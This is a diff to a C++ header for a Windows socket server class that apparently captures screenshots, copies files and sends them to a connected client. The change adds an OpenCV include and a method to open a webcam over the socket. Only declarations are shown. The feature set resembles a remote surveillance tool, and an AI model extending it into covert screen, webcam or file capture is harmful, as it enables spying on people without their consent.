@@ -12,6 +12,7 @@
 #include <vector>
 #include <cstdint>
 #include <sstream>
+#include <opencv2/opencv.hpp>
 
 // Ensure NO_ERROR is defined
 #ifndef NO_ERROR
@@ -38,11 +39,12 @@ private:
     SOCKET listenSocket;
     ULONG_PTR gdiplusToken; // Add this member
     void handleClient(SOCKET clientSocket);
-    void takeScreenshot(const std::string& filename);
+    // void takeScreenshot(const std::string& filename);
     // void sendScreenshot(SOCKET clientSocket, const std::string& filename);
     void sendScreenshot(SOCKET clientSocket, const std::string &filePath);
     std::vector<unsigned char> captureScreenshot();
     void copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName);
+    void openWebcam(SOCKET clientSocket);
 };
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
